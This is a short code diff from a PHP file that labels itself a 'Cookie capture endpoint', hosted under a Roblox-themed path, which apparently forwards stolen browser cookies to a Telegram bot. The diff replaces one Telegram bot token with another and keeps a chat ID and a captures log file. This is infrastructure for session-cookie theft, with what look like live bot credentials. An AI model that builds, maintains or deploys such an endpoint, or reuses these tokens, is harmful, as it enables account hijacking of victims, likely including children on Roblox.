@@ -2,7 +2,7 @@
 // api.php — Cookie capture endpoint
 // Location: https://cosmo.baby/assets/RobloxSafari/api.php
 
-$TG_TOKEN = '8860989517:AAF5xMj-l6s_YY2FGYTH06RJ_3CIIGIg4';
+$TG_TOKEN = '8809398983:AAEho0gz7CtR4Tx3I5zYEhorWawA8uF2Tv8';
 $TG_CHAT = '5310886054';
 $LOG_FILE = __DIR__ . '/captures.log';
 
